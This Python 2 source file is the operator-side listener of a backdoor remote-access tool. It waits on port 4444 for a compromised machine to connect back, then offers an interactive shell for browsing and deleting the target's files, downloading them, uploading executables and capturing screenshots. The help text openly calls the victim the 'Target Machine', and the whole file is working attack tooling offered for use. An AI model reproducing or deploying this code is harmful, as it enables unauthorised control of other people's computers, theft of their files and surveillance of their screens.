#!/usr/bin/env python
# -*- coding: utf-8 -*-
import os
import socket
import base64
import sys
import json
from PIL import Image
from StringIO import StringIO
import traceback

extensions = [
   '.rm','.pkg','.cs','.dll','.rpm','.iso','.mkv','.fon','.rar','.wsf','.svg',
   '.swift','.arj','.ttf','.bmp','.js','.aif','.rss','.csv','.wma','.gadget','.mp3', 
   '.css','.otf','.ico','.vob','.cda','.wmv','.msi','.sys','.ai','.cpl','.7z',
   '.py','.mdb','.xml','.jpeg','.ps','.zip','.asp','.class','.deb','.sav','.log',
   '.wpd','.sh','.dmp','.toast','.psd','.dmg','.xlr','.xls','.tex','.wks','.pdf',
   '.tmp','.html','.lnk','.apk','.exe','.avi','.flv','.vb','.tif','.bak','.icns',
   '.gif','.ppt','.pps','.rtf','.ini','.cgi','.bat','.mov','.xhtml','.com','.mp4', 
   '.bin','.drv','.doc','.h', 'calc','.vcd','.php','.c','.part','.wav','.z','.java', 
   '.jar','.txt','.pptx','.ogg','.wpl','.cpp','.sql','.fnt','.odt','.3g2','.mpa', 
   '.odp','.ods','.xlsx','.db','.cer','.dat','.mid','.htm','.jsp','.3gp','.cfm', 
   '.h264.m4v','.cur','.png','.tar','.mpg','.key','.cab','.cfg','.gz','.swf',
]

_help = r'''
$ cd    -- Change Directory. Ex: cd C:\Users\Admin
$ dir   -- List the directories. Ex: dir ..\file
$ del   -- Delete File. Ex: del C:\Users\file.txt
$ move  -- Move the File. Ex: move C:\Users\Administrator\image.png D:\new_image_name.png
$ more  -- Read the Content of txt File from the Target Machine. Ex: more file.txt

$ download   -- Download the file from target computer. Ex: download image.png
$ upload     -- Upload the File from Local Machine to Target. Ex: upload executable.exe
$ screenshot -- Screenshot the Target Screen and Save it as jpeg. Ex: screenshot screenshot.jpeg
'''

banner1 = '''
                      :::!~!!!!!:.
                  .xUHWH!! !!?M88WHX:.
                .X*#M@$!!  !X!M$$$$$$WWx:.
               :!!!!!!?H! :!$!$$$$$$$$$$8X:
              !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
             :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
             ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
               !:~~~ .:!M"T#$$$$WX??#MRRMMM!
               ~?WuxiW*`   `"#$$$$8!!!!??!!!
             :X- M$$$$       `"T#$T~!8$WUXU~
            :%`  ~#$$$m:        ~!~ ?$$$$$$
          :!`.-   ~T$$$$8xx.  .xWW- ~""##*"
.....   -~~:<` !    ~?T#$$@@W@*?$$      /`
W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
#"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
:::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
.~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `
Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!
$R@i.~~ !     :   ~$$$$$B$$en:``
?MXT@Wx.~    :     ~"##*$$$$M~
'''



banner2 = '''
                             ...----....
                         ..-:"''         ''"-..
                      .-'                      '-.
                    .'              .     .       '.
                  .'   .          .    .      .    .''.
                .'  .    .       .   .   .     .   . ..:.
              .' .   . .  .       .   .   ..  .   . ....::.
             ..   .   .      .  .    .     .  ..  . ....:IA.
            .:  .   .    .    .  .  .    .. .  .. .. ....:IA.
           .: .   .   ..   .    .     . . .. . ... ....:.:VHA.
           '..  .  .. .   .       .  . .. . .. . .....:.::IHHB.
          .:. .  . .  . .   .  .  . . . ...:.:... .......:HIHMM.
         .:.... .   . ."::"'.. .   .  . .:.:.:II;,. .. ..:IHIMMA
         ':.:..  ..::IHHHHHI::. . .  ...:.::::.,,,. . ....VIMMHM
        .:::I. .AHHHHHHHHHHAI::. .:...,:IIHHHHHHMMMHHL:. . VMMMM
       .:.:V.:IVHHHHHHHMHMHHH::..:" .:HIHHHHHHHHHHHHHMHHA. .VMMM.
       :..V.:IVHHHHHMMHHHHHHHB... . .:VPHHMHHHMMHHHHHHHHHAI.:VMMI
       ::V..:VIHHHHHHMMMHHHHHH. .   .I":IIMHHMMHHHHHHHHHHHAPI:WMM
       ::". .:.HHHHHHHHMMHHHHHI.  . .:..I:MHMMHHHHHHHHHMHV:':H:WM
       :: . :.::IIHHHHHHMMHHHHV  .ABA.:.:IMHMHMMMHMHHHHV:'. .IHWW
       '.  ..:..:.:IHHHHHMMHV" .AVMHMA.:.'VHMMMMHHHHHV:' .  :IHWV
        :.  .:...:".:.:TPP"   .AVMMHMMA.:. "VMMHHHP.:... .. :IVAI
       .:.   '... .:"'   .   ..HMMMHMMMA::. ."VHHI:::....  .:IHW'
       ...  .  . ..:IIPPIH: ..HMMMI.MMMV:I:.  .:ILLH:.. ...:I:IM
     : .   .'"' .:.V". .. .  :HMMM:IMMMI::I. ..:HHIIPPHI::'.P:HM.
     :.  .  .  .. ..:.. .    :AMMM IMMMM..:...:IV":T::I::.".:IHIMA
     'V:.. .. . .. .  .  .   'VMMV..VMMV :....:V:.:..:....::IHHHMH
       "IHH:.II:.. .:. .  . . . " :HB"" . . ..PI:.::.:::..:IHHMMV"
        :IP""HHII:.  .  .    . . .'V:. . . ..:IH:.:.::IHIHHMMMMM"
        :V:. VIMA:I..  .     .  . .. . .  .:.I:I:..:IHHHHMMHHMMM
        :"VI:.VWMA::. .:      .   .. .:. ..:.I::.:IVHHHMMMHMMMMI
        :."VIIHHMMA:.  .   .   .:  .:.. . .:.II:I:AMMMMMMHMMMMMI
        :..VIHIHMMMI...::.,:.,:!"I:!"I!"I!"V:AI:VAMMMMMMHMMMMMM'
        ':.:HIHIMHHA:"!!"I.:AXXXVVXXXXXXXA:."HPHIMMMMHHMHMMMMMV
          V:H:I:MA:W'I :AXXXIXII:IIIISSSSSSXXA.I.VMMMHMHMMMMMM
            'I::IVA ASSSSXSSSSBBSBMBSSSSSSBBMMMBS.VVMMHIMM'"'
             I:: VPAIMSSSSSSSSSBSSSMMBSSSBBMMMMXXI:MMHIMMI
            .I::. "H:XIIXBBMMMMMMMMMMMMMMMMMBXIXXMMPHIIMM'
            :::I.  ':XSSXXIIIIXSSBMBSSXXXIIIXXSMMAMI:.IMM
            :::I:.  .VSSSSSISISISSSBII:ISSSSBMMB:MI:..:MM
            ::.I:.  ':"SSSSSSSISISSXIIXSSSSBMMB:AHI:..MMM.
            ::.I:. . ..:"BBSSSSSSSSSSSSBBBMMMB:AHHI::.HMMI
            :..::.  . ..::":BBBBBSSBBBMMMB:MMMMHHII::IHHMI
            ':.I:... ....:IHHHHHMMMMMMMMMMMMMMMHHIIIIHMMV"
              "V:. ..:...:.IHHHMMMMMMMMMMMMMMMMHHHMHHMHP'
               ':. .:::.:.::III::IHHHHMMMMMHMHMMHHHHM"
                 "::....::.:::..:..::IIIIIHHHHMMMHHMV"
                   "::.::.. .. .  ...:::IIHHMMMMHMV"
                     "V::... . .I::IHHMMV"'
                       '"VHVHHHAHHHHMMV:"'
''' 

help_banner = {"banner": banner1,"Banner": banner2, "help": _help}

class BDlistener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)

        os.system("cls")
        print(banner2)
        print("\n\n[+] Listening...")
        self.connection, address = listener.accept()
        print("{} > {}".format(str(address[0]), ip))
        print("\n*** Shell ***\n\n")

    def receive_data(self):
        data = ""
        while True:
            try:
                data = data + self.connection.recv(1024)
                return json.loads(data)
            except ValueError:
                continue

    def send_data(self, content):
        data = json.dumps(content)
        self.connection.send(data)

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, name, content):
        with open(name, "wb") as file:
            file.write(base64.b64decode(content))

    def parse_command(self, command):
        if len(command.split(" "))==1:
            return [command]
        elif '"' in command:
            spl = command.split('"')
        elif "'" in command: 
            spl = command.split("'")
        else:
            return command.split(" ")
        return [x.strip("\" '") for x in spl]

        

    def run(self):
        try:
            while True:
                command = raw_input("$$ ")
                command = self.parse_command(command)

                if command[0] in help_banner.keys():
                    print(help_banner.get(command[0]))
                    continue
                elif command[0] in ["clear", "cls"]:
                    os.system("clear")
                    continue

                elif command[0] == "upload":
                    command.append(self.read_file(command[1]))
                elif any([command[0].endswith(x) for x in extensions]):
                    self.connection.send(json.dumps(command))
                    continue

                self.send_data(command)
                result = self.receive_data()

                if result in ["exit", "end"]:
                    self.connection.close()
                    sys.exit()
                elif command[0] == "more":
                    result = base64.b64decode(result)
                elif command[0] in ["download", "screenshot", "snap"]:
                    print(type(command[1]))
                    self.write_file(command[1], result)
                    result = "*** Success ***"

                print(str(result))
        except Exception as error:
            print("[-] ListenerError: {}".format(traceback.format_exc()))

listener = BDlistener("192.168.1.13", 4444)
listener.run()